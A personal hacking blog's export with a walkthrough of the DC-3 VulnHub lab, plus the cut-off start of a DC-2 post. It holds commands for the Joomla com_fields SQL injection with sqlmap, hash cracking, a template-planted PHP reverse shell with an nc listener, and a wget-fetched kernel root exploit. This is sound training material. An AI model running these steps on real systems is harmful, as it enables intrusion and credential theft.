[{"content":"I enjoyed DC-2\u0026rsquo;s Tom \u0026amp; Jerry theme! It showed us the concept of credential reuse and weak passwords, along with the wordpress and SUID exploits/abuses.\nAnyways, now onto DC-3.2 aka DC-3!\nDropdown to see DC-3's quick overview DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.\nLinux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.\nFor beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won\u0026rsquo;t give you the answer, instead, I\u0026rsquo;ll give you an idea about how to move forward.\nFor those with experience doing CTF and Boot2Root challenges, this probably won\u0026rsquo;t take you long at all (in fact, it could take you less than 20 minutes easily).\nIf that\u0026rsquo;s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.\nDetails can be found at https://www.five86.com/dc-3.html\nObtaining DC-3\u0026rsquo;s IP \u0026amp; Set Vars Depending on your lab environment, the way DC-3 is assigned an IP address will vary. In my current layout, I have DC-3 being hosted, through virtualbox, on a host-only adapter. This host-only network has a virtualbox DHCP server running at 192.168.56.100 and this assigns DC-3 it\u0026rsquo;s IP address: 192.168.56.113.\nRunning sudo netdiscover -i vboxnet0 -r 192.168.56.0/24 provides me the following result.\n-i vboxnet0 \u0026ndash;\u0026gt; is the host-only interface, created by virtualbox, in which DC-3 exists. I then follow up by assigning a few variables and echoing them back to review for syntax errors.\nnetdiscover followed by var assignment \u0026amp; echo Scanning and Enumeration With DC-3\u0026rsquo;s IP found and a few environmental variables set, let\u0026rsquo;s move onto scanning with nmap.\nScanning with nmap Let\u0026rsquo;s see what ports and services may be running on the target(DC-3).\nnmap $IP -T4 -p- -sC -sV --open\n$IP \u0026ndash;\u0026gt; is the previously exported IP address of DC-3. -T4 \u0026ndash;\u0026gt; T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap\u0026rsquo;s Timing Templates webpage. -p- \u0026ndash;\u0026gt; tells nmap to scan ALL 65,535 TCP ports. -sC \u0026ndash;\u0026gt; specifies nmap to run default scripts. -A includes this. -sV \u0026ndash;\u0026gt; enables version detection. -A includes this. --open \u0026ndash;\u0026gt; only shows ports that are \u0026ldquo;open\u0026rdquo;. Safe against a purposely vulnerable box. Using -A works too. It includes the two specified options above, plus traceroute.\ntrimmed up nmap results Looks like a Joomla CMS provided by an apache server hosted on Ubuntu.\nLet\u0026rsquo;s make some notes and move onto manual inspection.\nNotes \u0026amp; Try-List Box Name : DC-3 (DC Series)\nOS : Ubuntu (Linux)\nIP : 192.168.56.113\nPorts / Services\n80 : Apache httpd 2.4.18\n80 : Joomla v x.x???\nTry List \u0026ndash;\u0026gt; Manual Inspection(view source, robots.txt, etc) \u0026ndash;\u0026gt; fuzz directories/files \u0026ndash;\u0026gt; joomscan \u0026ndash;\u0026gt;\nManual Inspection :\nFuzzing Files :\nFuzzing Dirs :\njoomscan results :\nManual Inspection Browsing to 192.168.56.113 provides us the Joomla home page.\nQUICK TRY LIST: Default creds? \u0026ndash;\u0026gt; Failed admin:admin Username/Email Enum possible? \u0026ndash;\u0026gt; Failed. Same responses Robots.txt doesn\u0026rsquo;t exist. View Page Source \u0026ndash;\u0026gt; Nothing worth noting joomla home page Nothing obvious with the manual inspection, so let\u0026rsquo;s move onto fuzzing directories and files\u0026hellip;\nFuzzing Files Let\u0026rsquo;s see if the Joomla CMS has any files that are hidden or forgotten\u0026hellip;\nwfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile\n-c \u0026ndash;\u0026gt; provides a color output for the webapp\u0026rsquo;s response column. -z file,/*wordlist* \u0026ndash;\u0026gt; specifies payload type and points to file wordlist. --hc 403,404 \u0026ndash;\u0026gt; tells wfuzz not to display any 403 or 404 responses. $URLfile \u0026ndash;\u0026gt; is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. wfuzz - files Let\u0026rsquo;s manually visit each recorded response, in our browser, to see what each presents!\nindex.php - that\u0026rsquo;s the home page\u0026hellip; LICENSE.txt - nothing worth notating configuration.php - located in the root directory.. this provides Joomla needed parameters to properly run. db locations, settings, etc BUT we can\u0026rsquo;t access it. Not helpful for now but maybe we enum once we get access\u0026hellip; README.txt - provides a Joomla version of 3.7.0 - add that to our notes! htaccess.txt - file that specifies access control settings Well, we were able to enumerate Joomla\u0026rsquo;s versioning. 3.7.0!\nTime to enumerate the directories.\nFuzzing Directories Just like before but with the $URLdir variable and directories.txt wordlist. We\u0026rsquo;ll also add the option --hh 31, as this will filter out some responses that have no value to us(blank pages,forbidden,etc).\nwfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 --hh 31 $URLdir\nwfuzz - directories Again, just as before. Let\u0026rsquo;s visit the response\u0026hellip;/administrator/\nLooks like an admin login page but with no usernames, attempting to login would be a waste.\nUpdating our notes Box Name : DC-3 (DC Series)\nOS : Ubuntu (Linux)\nIP : 192.168.56.113\nPorts / Services\n80 : Apache httpd 2.4.18\n80 : Joomla v3.7.0\nTry List \u0026ndash;\u0026gt; joomscan\nManual Inspection : Nothing worthy\nFuzzing Files : README.txt provides versioning 3.7.0\nFuzzing Dirs : /administrator/ provides admin login form\njoomscan :\nEnum/Vuln scan with joomscan joomscan, an OWASP project, is aimed at automating vulnerability detection of Joomla CMS deployments.\nPlease see OWASP\u0026rsquo;s joomscan github for more information.\nIt\u0026rsquo;s very simple to run, but let\u0026rsquo;s go ahead and export an enviroment variable called URLjoomscan.(It\u0026rsquo;s good practice, that\u0026rsquo;s why!)\nexport URLjoomscan=\u0026quot;http://192.168.56.113/\u0026quot; Now let\u0026rsquo;s run joomscan\njoomscan -u $URLjoomscan We get a version confirmation of 3.7.0. It also shows there\u0026rsquo;s no Joomla core vulnerability but this isn\u0026rsquo;t true. The next section will show otherwise. Confirming a tool\u0026rsquo;s findings is an important step, as you\u0026rsquo;ll sometimes run into false results!\nJoomla 3.7.0 and admin login page - confirmed Researching Exploits We\u0026rsquo;re not at a dead-end but since we have a confirmed version of Joomla 3.7.0, let\u0026rsquo;s go ahead and searchsploit it.\nSearchsploit isn\u0026rsquo;t the only option and shouldn\u0026rsquo;t be. I don\u0026rsquo;t document it on these posts, but I do spend time on google researching exploits. Searchsploit isn\u0026rsquo;t the end all of finding an exploit. There\u0026rsquo;s many hidden gems out there!\nSearchsploit joomla 3.7 searchsploit joomla 3.7 results in the following(see pic)\nsearchsploit 3.7 results There\u0026rsquo;s two \u0026ldquo;non-search\u0026rdquo; options we can use to interact with the searchsploit results:\n-m aka --mirror - this copies an exploit to the current working directory. -x aka --examine - this displays the exploit contents in the terminal. I\u0026rsquo;ll be using the -m option to copy the file to the current working directory. Since there\u0026rsquo;s two exploits I\u0026rsquo;m interested in, I\u0026rsquo;ll copy each.\nsearchsploit -m php/remote/44227.php \u0026amp;\u0026amp; searchsploit -m php/webapps/42033.txt After looking at both exploits, the 44227.php file concatenates the joomla database tables for usernames, emails, dbusers, dbnames, dbversion while the 42033.txt file just shows a few SQLi examples. One example is through sqlmap!\nI want to get more experience using sqlmap, so this will be the path I take.\nThe vulnerability, in Joomla, looks to relate to the com_fields component being accessible by the public but is also used for internal administrative use. We\u0026rsquo;ll be abusing this\u0026hellip;\nYou can test for SQL injection by simply running the following in your browser\nhttp://192.168.56.113/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=%27 If you get this response, then it\u0026rsquo;s vulnerable to SQLi!\nConfirming SQLi for Joomla 3.7.0 Exploiting Again, I\u0026rsquo;ll be using sqlmap to dump data from the SQL db but feel free to approach this how you\u0026rsquo;d like! That\u0026rsquo;s part of the fun!\nRunning sqlmap against Joomla File 42033.txt gives us this example to run, so let\u0026rsquo;s try it out.\nsqlmap -u \u0026quot;http://localhost/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] You\u0026rsquo;ll want to replace \u0026ldquo;localhost\u0026rdquo; with DC-3\u0026rsquo;s IP address. -u \u0026ndash;\u0026gt; specifies the URL in which we\u0026rsquo;re attacking. We need to include the entire syntax of the com_fields address as it\u0026rsquo;s the exploit we\u0026rsquo;re abusing. --risk=3 \u0026ndash;\u0026gt; basically runs most(loudest) tests. We\u0026rsquo;re not being stealthy, so it\u0026rsquo;s OK. --level=5 \u0026ndash;\u0026gt; provides us a higher level of verbose --dbs \u0026ndash;\u0026gt; Enumerates DBMS databases --p list[fullordering] \u0026ndash;\u0026gt; our output format Just hit enter to run defaults if you\u0026rsquo;re asked any questions during runtime.\nMySQL - databases mysql confirmed MySQL version \u0026gt;=5.1. Add this to the notes!\nThis results in a list of the databases in the MySQL server.\nLet\u0026rsquo;s now specify the database by using -D joomladb and list out its tables.\nsqlmap -u \u0026quot;http://localhost/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] Remove --dbs and add -D joomladb - this specifies the \u0026ldquo;joomladb\u0026rdquo; database we want to query aka \u0026ldquo;USE DATABASE joomla;\u0026rdquo; Add --tables \u0026ndash;\u0026gt; this basically runs \u0026ldquo;SHOW tables;\u0026rdquo; MySQL - joomladb tables It\u0026rsquo;s a longer list, but we\u0026rsquo;re seeing a #__users table. Let\u0026rsquo;s go ahead and --dump it\u0026rsquo;s data.\nsqlmap -u \u0026quot;http://localhost/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026quot; --risk=3 --level=5 --random-agent -D joomladb -T \u0026quot;#__users\u0026quot; --dump -p list[fullordering] Replace --tables with -T \u0026quot;#__users\u0026quot; \u0026ndash;\u0026gt; this specifies the table Add --dump \u0026ndash;\u0026gt; this will dump all the data in the #__users table. It might ask \u0026ldquo;do you want to use common column existence check\u0026rdquo;.. answer y When asked about which dictionary to use, default #1 is fine. 1 thread is fine. Press enter to run the default speed. MySQL Table Dump! Nice! We end up with a dump showing the details of the username admin, including the password hash!\nCracking hashes with hashcat Before we can crack the hash, we need to do two things.\nMove the hash into a file for hashcat. Figure out what hash algorithm was used. Let\u0026rsquo;s place $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu into a file, so we can feed it to hashcat\necho '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' \u0026gt; dc-3-mysql-hash-dump.txt After researching the hash on google, I found that hashes starting with $2y$ are bcrypt. We tell hashcat it\u0026rsquo;s bcrypt with option -m 3200\nNow that we know the hashing algorithm and the hash is inside a file, let\u0026rsquo;s run hashcat!\nhashcat -m 3200 -a 0 dc-3-mysql-hash-dump.txt /usr/share/wordlists/rockyou.txt -m 3200 \u0026ndash;\u0026gt; specifies bcrypt hash algorithm -a 0 \u0026ndash;\u0026gt; tells hashcat to run a straight attack, it runs against each word in the dictionary without character alteration *.txt \u0026ndash;\u0026gt; is the files containing the hashes /*/wordlist.txt \u0026ndash;\u0026gt; specifies the location of the wordlist Username admin hash cracked!! We now have an email, username, and password! Let\u0026rsquo;s update our notes! Plus MySQL versioning and potential username:freddy.\nUpdating our notes again Box Name : DC-3 (DC Series)\nOS : Ubuntu (Linux)\nIP : 192.168.56.113\nPorts / Services\n80 : Apache httpd 2.4.18\n80 : Joomla v3.7.0\nManual Inspection : Nothing worthy\nFuzzing Files : README.txt provides versioning 3.7.0\nFuzzing Dirs : /administrator/ provides admin login form\njoomscan : confirmed versioning 3.7.0\nADDITIONAL SERVICES\nMySQL - \u0026gt;= 5.1\nEMAILS\nfreddy@norealaddress[.]net\nCREDENTIALS\nadmin:snoopy - Joomla\nPOTENTIAL USERNAMES\nfreddy\nLogging into Joomla as admin Head to /administrator/ login form and use our newly cracked password \u0026ndash;\u0026gt; admin:snoopy.\nLogged in as admin - Joomla We\u0026rsquo;re now logged into Joomla as admin!\nAt this point, it\u0026rsquo;s good to look around the admin panel to see what there is to notate. Versions? Other users? Anything!\nA good place to start, with Joomla, is in the System \u0026gt; System Information panel\nJoomla\u0026#39;s configuration panel Although a back burner item, notating the kernel version is important as it may be the last easy way to gaining privesc.\nI found the following information and added them to the notes.\nKernel \u0026ndash;\u0026gt; Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686\nUbuntu \u0026ndash;\u0026gt; 5.7.25-0ubuntu0.16.04.2\nPHP Version \u0026ndash;\u0026gt; 7.0.33-0ubuntu0.16.04.2\nApache \u0026ndash;\u0026gt; Apache/2.4.18 (Ubuntu)\nServer API\u0026ndash;\u0026gt; Apache2Handler 20120211\nZend Engine \u0026ndash;\u0026gt; v3.0.0\nMySQL \u0026ndash;\u0026gt; 5.0.12-dev\nOpenSSL \u0026ndash;\u0026gt; 1.0.2g\nBox Name : DC-3 (DC Series)\nKernel/OS : Ubuntu (Linux) Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 \u0026ndash; 5.7.25-0ubuntu0.16.04.2\nIP : 192.168.56.113\nPorts / Services\n80 : Apache httpd 2.4.18\n80 : Joomla v3.7.0\nManual Inspection : Nothing worthy\nFuzzing Files : README.txt provides versioning 3.7.0\nFuzzing Dirs : /administrator/ provides admin login form\njoomscan : confirmed versioning 3.7.0\nADDITIONAL SERVICES\nMySQL \u0026ndash;\u0026gt; 5.0.12-dev\nPHP \u0026ndash;\u0026gt; 7.0.33-0ubuntu0.16.04.2\nApache2Handler \u0026ndash;\u0026gt; 20120211\nZend Engine \u0026ndash;\u0026gt; 3.0.0\nOpenSSL \u0026ndash;\u0026gt; 1.0.2g\nEMAILS\nfreddy@norealaddress[.]net\nCREDENTIALS\nadmin:snoopy - Joomla\nPOTENTIAL USERNAMES\nfreddy\nNow that we have admin access, will it allow us to inject malicious php code into the php forms?\nreverse-shell against a template I quickly found two possible ways to gain reverse shells through PHP.\nUpload option located at Content \u0026gt; Media (there may be upload restrictions you have to get around. See Contect \u0026gt; Media \u0026gt; Options) php templates in Extension \u0026gt; Templates \u0026gt; Templates With the Content \u0026gt; Media option, you\u0026rsquo;d want to upload the revshell then somehow execute it.. This can be done by visiting the file by simply accessing it e.g. http://192.168.56.113/images/malicious-file.extension\nOption two is done by simply pasting pentestmonkey\u0026rsquo;s php-revshell code into a template and previewing it. aka the contents of the .php file you\u0026rsquo;d use for option #1 is executed when Joomla previews the code.\nI\u0026rsquo;ll go the template route.\nNavigate to the Beez3 template by Extensions \u0026gt; Templates \u0026gt; Templates \u0026gt; Beez3 Details and Files \u0026gt; index.php then paste revshell over the existing data. Edit the $ip and $port variables to match your attack system\u0026rsquo;s IP and the port you\u0026rsquo;d like to use. e.g. 1234.\nDO NOT SAVE \u0026amp; PREVIEW the template yet! Netcat needs configured\nPHP revshell configured and ready! Now it\u0026rsquo;s time to setup netcat, so it\u0026rsquo;s listening on the port you previously specified in the php template. Open another terminal tab and run:\nnc -nvlp 1234 n \u0026ndash;\u0026gt; uses IP addressing and not DNS v \u0026ndash;\u0026gt; verbose mode l \u0026ndash;\u0026gt; tells nc to listen p \u0026ndash;\u0026gt; specifies the port e.g. 1234 Now that we have nc listening, it\u0026rsquo;s time to get a revshell!\nJump back to Joomla and click \u0026ldquo;Save \u0026amp; Close\u0026rdquo; followed by clicking \u0026ldquo;Template Preview\u0026rdquo;.\nWe have remote shell!\nSuccessful revshell Post-Exploitation Now that we have a revshell, we\u0026rsquo;ll want to establish a stable shell that has tty and continue enumeration, search for privesc exploits/abuses, and finally gain root.\nUpgrading shell incl. tty Let\u0026rsquo;s check for tty. Nope.\nLet\u0026rsquo;s check for restricted shell by running a few commands\u0026hellip; ls cd / echo. No rbash!\nSo let\u0026rsquo;s get us a stable shell with tty. Thanks to S1ren\u0026rsquo;s blog!\nLet\u0026rsquo;s check for python\u0026hellip; with which python. Sweet. Let\u0026rsquo;s spawn a python shell!\npython -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' - this spawns a bash shell, with tty, through python Now let\u0026rsquo;s set PATH variables, output color, and an alias.\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp \u0026ndash;\u0026gt; export variables export TERM=xterm-256color \u0026ndash;\u0026gt; color in terminal alias ll='ls -lsaht --color=auto' \u0026ndash;\u0026gt; ll runs ls -lsaht Press Ctrl + Z to make our zhs shell a background process through netcat(nc) stty raw -echo;fg;reset then enter twice \u0026ndash;\u0026gt; input and output is not processed, e.g. can\u0026rsquo;t cancel shell by CTRL+C, then opens background shell with reset stty columns 200 rows 200 \u0026ndash;\u0026gt; this sets columns and rows to max on terminal output Now CTRL+C won\u0026rsquo;t disconnect us and we have nice terminal output. 😃\nA stable python spawned bash shell with tty Checking for sudo privs Let\u0026rsquo;s see if we have sudo privs by running sudo -l.. well it\u0026rsquo;s asking for a password and snoopy does not work.\nSo, we\u0026rsquo;ll either need to find user www-data\u0026rsquo;s password or find another privesc path.\nenum /etc/shadow \u0026amp; /etc/passwd Let\u0026rsquo;s see if we have access to cat /etc/shadow or cat /etc/passwd. Denied access to shadow but we have access to passwd.\nuser dc3 found In linux, user created users start with an ID of 1000. e.g. 1000 and 1001 would indicate two users NOT including root. Root is always ID 0.\nLooks like we have a user to add to our notes: dc3\nSearching binaries w/ SUID bit set The SUID, Set User ID, is a feature that allows a binary to run under the permissions of another user. The abuse comes from administrators setting the SUID bit on binaries that are abusable and share root permissions.\nAfter we find the SUID binaries, we check them for abuse through an online reference like GTFOBins.\nTo search the target for binaries which have the SUID bit set, we\u0026rsquo;ll run the following command:\nfind / -perm -u=s -type f 2\u0026gt;/dev/null\nfind / \u0026ndash;\u0026gt; searches the root directory where the\u0026hellip; -perm -u=s \u0026ndash;\u0026gt; permission, for the current user, is set to s \u0026ldquo;sticky bit\u0026rdquo; -type f \u0026ndash;\u0026gt; to only list files 2\u0026gt;/dev/null \u0026ndash;\u0026gt; redirects any errors to a black hole in space 😁 SUID set binaries The at binary is abusable for privesc BUT it requires the user to have SUDO privs to the file and not SUID, so this is a dead end since we lack SUDO privs.\nLooking for abusable cron jobs Let\u0026rsquo;s see what processes are running as \u0026lsquo;root\u0026rsquo; by executing the following:\nps -U root -u root u\nthis shows every process running as root in user format. Pulled from ps man page. cron running as root I looked for anything abusable running under a cronjob but there was nothing.\nDigging into /html root Let\u0026rsquo;s see if Joomla\u0026rsquo;s configuration file holds anything special\u0026hellip;\ncat /var/www/html/configuration.php\nLooks like we found the root MySQL database password!\nroot:squires\nMySQL creds found Accessing MySQL db mysql -uroot -psquires\nWe end up having root access to the MySQL database but nothing of value was found.\nUpdating \u0026amp; Reviewing Notes I tried using all combinations of username/passwords for su and got nowhere.\nThe only other thing to check is the kernel. It may be exploitable.\nAt this point, let\u0026rsquo;s gather all the kernel/OS info and add it to our notes, or confirm what we already have, so we can find the best possible exploit.\nfile /bin/bash\ncat /etc/*-release\nuname -a\nThis results in the following:\nKernel \u0026amp; OS Info Box Name : DC-3 (DC Series)\nOS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel\nIP : 192.168.56.113\nPorts / Services\n80 : Apache httpd 2.4.18\n80 : Joomla v3.7.0\nManual Inspection : Nothing worthy\nFuzzing Files : README.txt provides versioning 3.7.0\nFuzzing Dirs : /administrator/ provides admin login form\njoomscan : confirmed versioning 3.7.0\nexfil of admin credentials via SQL injection\ncommand execution through php to gain remote shell\nADDITIONAL SERVICES\nMySQL \u0026ndash;\u0026gt; 5.0.12-dev\nPHP \u0026ndash;\u0026gt; 7.0.33-0ubuntu0.16.04.2\nApache2Handler \u0026ndash;\u0026gt; 20120211\nZend Engine \u0026ndash;\u0026gt; 3.0.0\nOpenSSL \u0026ndash;\u0026gt; 1.0.2g\nEMAILS\nfreddy@norealaddress[.]net\nCREDENTIALS\nadmin:snoopy - Joomla\nroot:squires - MySQL\nPOTENTIAL USERNAMES\nfreddy , dc3\nGaining root! The plan: we\u0026rsquo;re going to searchsploit, look for an exploit, figure out how to execute the exploit, execute the exploit, and hopefully gain root!\nSearchsploit per OS/Kernel We\u0026rsquo;re going to searchsploit the OS and kernel versions for any exploit that\u0026rsquo;ll gain us privilege escalation while making sure it\u0026rsquo;s not 64-bit.\nsearchsploit is picky with syntax. If you include too much in your search query, you might miss out on a result. e.g. searchsploit 4.4.0 may miss out on the result of 4.4.x since 0 was specified.\nLet\u0026rsquo;s run searchsploit ubuntu 16.04 4.4 priv esc\nThis will look for any exploits that include ubuntu + 16.04 + 4.4 + priv + esc and we get the following results! searchsploit\u0026#39;s kernel exploit results I\u0026rsquo;m going to choose the linux/local/39772.txt and the chances of it working increase when seeing a \u0026ldquo;x\u0026rdquo; in the kernel results 4.4.*x*.\nLet\u0026rsquo;s copy the text file over to our current working directory. Since searchsploit copies files to the current working directory, please cd into desired directory before running:\nsearchsploit -m linux/local/39772.txt\nNow let\u0026rsquo;s nano 39772.txt to see the details of the exploit like what needs configured(if needed), how to execute, etc\nIt looks like we need access to the following binaries, on the target machine, in order to execute the exploit.\nwhich wget \u0026ndash;\u0026gt; Found it! To transfer the exploit from attackbox to the target. which unzip \u0026ndash;\u0026gt; Found it! To unzip the 39772.zip file. which tar \u0026ndash;\u0026gt; Found it! To untar the exploit.tar file. which cc \u0026ndash;\u0026gt; Found it! To compile the *.c files.\nSweet! We\u0026rsquo;re good to transfer, compile, and run the exploit. Let\u0026rsquo;s download the exploit to our attackbox. 😁\nwget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip\nI use vim to look inside the zip file and it holds the *.tar file needed to exploit the target: exploit.tar. The crasher.tar is the PoC, and is NOT needed.\nGood to know as we\u0026rsquo;ll need to unzip this archive, once on the target, and compile the exploit to run.\nContents of 39772.zip Let\u0026rsquo;s now move onto transferring the exploit and executing it!\nTransferring the exploit On the attackbox\u0026rsquo;s terminal, you\u0026rsquo;ll want to start up a http server, of sorts, to host the exploit, so the target can download it. I do this with python.\npython -m http.server \u0026ndash;\u0026gt; this will run a http server within the current working directory which is where I downloaded the 39772.zip file.\nLet\u0026rsquo;s hop back onto the target\u0026rsquo;s terminal and cd /var/tmp. I choose /var/tmp as it\u0026rsquo;ll preserve our exploit through reboots. I\u0026rsquo;m doing this in case the system crashes and its needed for a second run.\nNormally, we place exploits in /tmp since it\u0026rsquo;s cleared at reboot.\nWhen it comes to pentests, it\u0026rsquo;s important to clean up after yourself and revert any settings/changes that were made. Unless specified, you never want to leave changes in place as it might alter the operations of the business.\nOnce in /var/tmp, we run the following to download the exploit from the attackbox.\nwget http://192.168.56.1:8000/39772.zip\nwget \u0026ndash;\u0026gt; is a simple network downloader that exists on most standard linux distros. http://192.168.56.1:8000/ \u0026ndash;\u0026gt; is my attackbox\u0026rsquo;s IP, along with the default port http.server uses 39772.zip \u0026ndash;\u0026gt; is the exploit we downloaded earlier. Here\u0026rsquo;s a successful transfer, of 39772.zip, from the attackbox to the target.\nAttackbox - file transfer successful Targetbox - file transfer successful We can now ll, on the target\u0026rsquo;s terminal, and see that we have the file in the current working directory.\nExploiting Kernel 4.4.0-21-generic! Now that we have the kernel exploit on the target machine, we\u0026rsquo;re set to extract, compile, and execute.\nunzip 39772.zip \u0026ndash;\u0026gt; unzip folder\u0026rsquo;s contents into a folder with the same name \u0026ldquo;39772\u0026rdquo;\ncd 39772 \u0026ndash;\u0026gt; will change working directory into the \u0026ldquo;39722\u0026rdquo; folder, which contains the tar files\nll \u0026ndash;\u0026gt; will show the two files, but we\u0026rsquo;ll only need to untar the exploit.tar file.\ntar -xvf exploit.tar \u0026ndash;\u0026gt; this untars the exploit.tar file.\nll again \u0026ndash;\u0026gt; you\u0026rsquo;ll see a folder called \u0026ldquo;ebpf_mapfd_doubleput_exploit\u0026rdquo;\ncd ebpf_mapfd_doubleput_exploit \u0026ndash;\u0026gt; cd into ebpf_mapfd_doubleput_exploit folder\nll again \u0026ndash;\u0026gt; you\u0026rsquo;ll see a compile.sh file. This is the file that\u0026rsquo;ll compile, using cc, the exploit that we\u0026rsquo;ll execute.\n./compile.sh \u0026ndash;\u0026gt; You may see some errors, and since they\u0026rsquo;re non critical we\u0026rsquo;ll ignore them.\nll again \u0026ndash;\u0026gt; you should see a few new files. suidhelper, doubleput, and hello.\nexploit ready for execution! Now we have an exploit, called doubleput, that\u0026rsquo;s ready to be executed!! Let\u0026rsquo;s get to it already!\n./doubleput \u0026ndash;\u0026gt; executes the exploit\u0026hellip;. and\u0026hellip;\nROOTED!! ROOT GAINED!!! Updating notes incl. attack process! Box Name : DC-3 (DC Series)\nOS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel\nPriviledge Escalation gained by exploiting vulnerability in Linux Kernel 4.4.0-21-generic.\nExploit used = Linux Kernel 4.4.x (Ubuntu 16.04) - \u0026lsquo;double-fdput()\u0026rsquo; bpf(BPF_PROG_LOAD) Privilege Escalation\nIP : 192.168.56.113\nPorts / Services\n80 : Apache httpd 2.4.18\n80 : Joomla v3.7.0\nManual Inspection : Nothing worthy\nFuzzing Files : README.txt provides versioning 3.7.0(Info Disclosure)\nFuzzing Dirs : /administrator/ provides admin login form\njoomscan : confirmed versioning 3.7.0\nExfil of Joomla\u0026rsquo;s admin hashed credential, through a SQL injection vulnerability in Joomla\u0026rsquo;s Core (Exploit used = Joomla! 3.7.0 - \u0026lsquo;com_fields\u0026rsquo; SQL Injection), granted admin access to Joomla\u0026rsquo;s admin panel which allowed for remote code execution resulting in a reverse shell to DC-3. This php revshell RCE was accomplished through Joomla\u0026rsquo;s php templates.\nOnce the reverse shell was established, we gained full access to the MySQL database after finding clear text root MySQL credentials within Joomla\u0026rsquo;s configuration file.\nTo gain root privileges, we exploited DC-3\u0026rsquo;s vulnererable linux kernel by the above listed exploit, \u0026lsquo;double-fdput()\u0026rsquo;\nADDITIONAL SERVICES\nMySQL \u0026ndash;\u0026gt; 5.0.12-dev\nPHP \u0026ndash;\u0026gt; 7.0.33-0ubuntu0.16.04.2\nApache2Handler \u0026ndash;\u0026gt; 20120211\nZend Engine \u0026ndash;\u0026gt; 3.0.0\nOpenSSL \u0026ndash;\u0026gt; 1.0.2g\nEMAILS\nfreddy@norealaddress[.]net\nCREDENTIALS\nadmin:snoopy - Joomla\nroot:squires - MySQL\nUSERNAMES\ndc3 - DC-3 ID=1000\nPOTENTIAL USERNAMES\nfreddy\nThanks for visiting! I hope you enjoyed DC-3. Next, DC-4!\n","description":"","id":0,"section":"hacking","tags":["DC-3 (vulnhub)"],"title":"DC-3 of DC Series(vulnhub)","uri":"https://MRCyberBlog.github.io/blog/hacking/ctfs/vulnhub/dc-series/dc-3/"},{"content":"With DC-1 out of the way, let\u0026rsquo;s move onto DC-2 of the DC Series!\nDropdown to see DC-2's quick overview Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. As with the original DC-1, it\u0026rsquo;s designed with beginners in mind.\nLinux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.\nJust like with DC-1, there are five flags including the final flag.\nAnd again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.\nIn short, the only flag that really counts, is the final flag.\nFor beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.\nI haven\u0026rsquo;t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.\nDetails can be found at https://www.five86.com/dc-2.html\nFinding DC-2\u0026rsquo;s IP Once you\u0026rsquo;ve imported, configured, and started the DC-2 VM, let\u0026rsquo;s acquire its IP by running\nsudo netdiscover -r *IP*/*CIDR* from our attack box\u0026rsquo;s terminal. -r specifies the IP range by IP/CIDR notation.\n(There\u0026rsquo;s always another way to reaching similar outcomes, so feel free to use your own techniques/tools to acquire DC-2\u0026rsquo;s IP address.)\nIf you see two asterisks surrounding some characters, like *IP*, removal of the asterisks and inserting the appropriate characters is needed.\nIn this case, *IP* and *CIDR* need replaced by the IP address(e.g. 192.168.56.0) and subnet mask shorthand via CIDR(/24), in which DC-2 exists, respectively.\nDepending on my attack system\u0026rsquo;s interface/routing configuration, I may have to run the netdiscover command with the -i option. -i specifies which interface I want the ARP requests to be sent through. As I\u0026rsquo;m running multiple NICs, a VPN, and virtualbox, on this particular attack box, I have to run the following command to grab DC-2\u0026rsquo;s IP:\nsudo netdiscover -i vboxnet0 -r 192.168.56.0/24\nPS You\u0026rsquo;ll need to CTRL+C to exit netdiscover.\nnetdiscover tool - *.100 is the virtualbox DHCP server while *.111 is DC-2 Now that we have DC-2\u0026rsquo;s IP address, let\u0026rsquo;s move onto setting up environment variables through the attack box\u0026rsquo;s terminal.\nExporting Environment Variables To speed up a few future commands, let\u0026rsquo;s export a few environment variables to include the IP address we obtained earlier.\nexport IP=\u0026quot;*IP*\u0026quot; \u0026ndash;\u0026gt; This will create a variable, named $IP, containing DC-2\u0026rsquo;s IP address.\n- e.g. export IP=\u0026quot;192.168.56.111\u0026quot; export URLdir=\u0026quot;http://*IP*/FUZZ/\u0026quot; \u0026ndash;\u0026gt; Variable for fuzzing directories. We append a backslash / to specify directories.\n- e.g. export URLdir=\u0026quot;http://192.168.56.111/FUZZ/\u0026quot; export URLfile=\u0026quot;http://*IP*/FUZZ\u0026quot; \u0026ndash;\u0026gt; A var useful for fuzzing files.\n- 